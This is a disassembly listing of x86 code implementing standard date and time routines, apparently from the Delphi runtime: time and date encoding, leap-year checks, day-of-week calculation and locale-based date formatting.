mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409608
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409678
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4095c4
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407d00
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407d00
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407d00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4096d4
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409710
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_4096d4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4097d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4095c4
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407d00
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407d00
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407d00
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_4096d4
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409924
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4097d8
pop esi
pop ecx
pop ebp
retn 0x8
sub_409944
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4095c4
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409980
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028f0
sub_4099c4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4042a8
mov edx eax
mov eax ebx
call sub_409980
pop ecx
pop ebx
pop ebp
retn
sub_4099e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_4089b0
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409980
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409a30
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409a5c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409924
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409a94
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409678
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409ad4
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409c22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fe8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404080
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409c29
lea eax [ ebp - 0x118 ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404258
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4042a8
mov edx eax
mov eax [ ebx ]
call sub_40c0a0
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c214
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404508
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c1b0
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4041e0
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c214
mov ecx eax
mov eax ebx
mov edx esi
call sub_4040d8
sub_409c3c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409d1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fe8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404080
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404080
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409d21
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404258
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4042a8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404508
sub_409d44
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a4c5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a4cc
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_40400c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c294
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c274
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409980
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c294
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409980
pop ecx
mov al [ eax + lookup_table_409e27 ]
jmp [ eax * 4 + jump_table_409e60 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409a30
pop ecx
push ebp
call sub_409a5c
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409a30
pop ecx
push ebp
call sub_409a5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409ad4
pop ecx
mov eax [ ebp - 0x24 ]
call sub_4099c4
pop ecx
jmp r-xdata
push ebp
call sub_409a30
pop ecx
push ebp
call sub_409a5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409c3c
pop ecx
mov eax [ ebp - 0x28 ]
call sub_4099c4
pop ecx
jmp r-xdata
push ebp
call sub_409a30
pop ecx
push ebp
call sub_409a5c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409a30
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409a30
pop ecx
push ebp
call sub_409a94
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409a30
pop ecx
push ebp
call sub_409a94
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409a30
pop ecx
push ebp
call sub_409a94
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409a30
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409a30
pop ecx
push ebp
call sub_409a94
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409a94
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408820
test eax eax
jne r-xdata
push ebp
call sub_409a30
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d44
pop ecx
push ebp
call sub_409a94
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_4099e4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_4099e4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4099e4
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409a5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_4099e4
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_4099e4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_4099e4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d44
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d44
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4099e4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408820
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409980
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d44
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409980
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409980
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4099c4
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409944
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4099c4
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408820
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409980
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409980
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4099c4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409944
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4099c4
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c294
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408820
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409980
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d44
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_4099e4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408820
test eax eax
jne r-xdata
push ebp
call sub_409a5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409944
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4099c4
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099c4
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c294
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d44
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409980
pop ecx
jmp r-xdata
push ebp
call sub_409a5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409944
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4099c4
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408820
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408820
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408820
test eax eax
jne r-xdata
jmp r-xdata
sub_40a4f8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409d44
pop ecx
push ebp
mov eax ebx
call sub_409d44
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_4040d8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a568
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4042a8
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a58c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a568
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4042a8
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a620
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a699
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a6a0
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a568
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4042a8
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404508
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407f3c
test eax eax
jne r-xdata
mov eax edi
call sub_4042a8
add [ esi ] eax
mov bl 0x1
sub_40a6ac
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a568
mov eax esi
call sub_4042a8
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a6e4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4042a8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a730
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4042a8
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c2d8
mov [ ebx ] eax
jmp r-xdata
sub_40a778
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4044a8
push eax
mov eax [ ebx ]
call sub_4044a8
pop edx
call sub_40c34c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a7cc
push ebp
